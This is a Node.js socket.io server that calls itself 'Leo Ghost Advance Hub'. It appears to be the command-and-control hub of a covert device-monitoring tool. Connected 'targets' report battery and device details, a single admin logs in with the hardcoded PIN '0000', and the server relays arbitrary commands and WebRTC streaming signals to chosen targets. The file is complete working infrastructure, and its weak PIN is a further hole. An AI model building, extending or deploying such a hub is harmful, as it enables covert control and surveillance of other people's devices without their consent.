const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

app.use(express.static('public'));

let adminSocketId = null;
let targetData = {}; // To store info like battery/device

io.on('connection', (socket) => {
    socket.on('admin-join', (pin) => {
        if (pin === "0000") {
            adminSocketId = socket.id;
            socket.emit('admin-status', { success: true });
            updateTargetList();
        } else {
            socket.emit('admin-status', { success: false });
        }
    });

    socket.on('target-join', (info) => {
        socket.join('targets_room');
        targetData[socket.id] = info || { battery: "N/A", device: "Unknown" };
        updateTargetList();
    });

    socket.on('signal', (data) => {
        io.to(data.to).emit('signal', { from: socket.id, signal: data.signal });
    });

    socket.on('command', (data) => {
        io.to(data.targetId).emit('command', { cmd: data.cmd, adminId: socket.id });
    });

    socket.on('disconnect', () => {
        if (socket.id === adminSocketId) adminSocketId = null;
        delete targetData[socket.id];
        updateTargetList();
    });
});
function updateTargetList() {
    if (adminSocketId) {
        const targets = io.sockets.adapter.rooms.get('targets_room');
        const list = targets ? Array.from(targets).map(id => ({
            id: id,
            battery: targetData[id]?.battery || "N/A",
            device: targetData[id]?.device || "Unknown"
        })) : [];
        io.to(adminSocketId).emit('update-targets', list);
    }
}

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => console.log(`Leo Ghost Advance Hub Live`));
